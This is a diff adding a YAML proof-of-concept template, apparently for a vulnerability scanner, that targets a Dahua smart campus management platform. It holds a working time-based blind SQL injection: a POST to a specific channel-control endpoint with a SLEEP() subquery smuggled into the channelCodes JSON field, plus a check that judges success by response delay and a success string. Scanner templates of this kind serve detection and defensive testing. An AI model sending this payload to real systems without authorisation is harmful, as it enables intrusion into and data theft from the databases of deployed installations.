@@ -1,0 +1,20 @@
+id: poc-yaml-dahua-smart-campus-management-sql-injection
+info:
+  name: 大华-智慧园区综合管理平台-SQL注入
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 大华智慧园区综合管理平台
+variables:
+  t1: random_int(5,10)
+requests:
+- method: POST
+  path: /CardSolution/card/accessControl/channelControl/channels?systime=1675860972982
+  headers:
+    Content-Type: application/json; charset=UTF-8
+  data: '{"channelCodes":["1'') AND (SELECT 9938 FROM (SELECT(SLEEP({{.t1}})))nLti)
+    AND (''yYYm''=''yYYm"]}
+
+    '
+  expression: status_code == 200 && duration > t1 && contains(body, "\"errMsg\":\"success\",\"success\":true}")
+transport: http
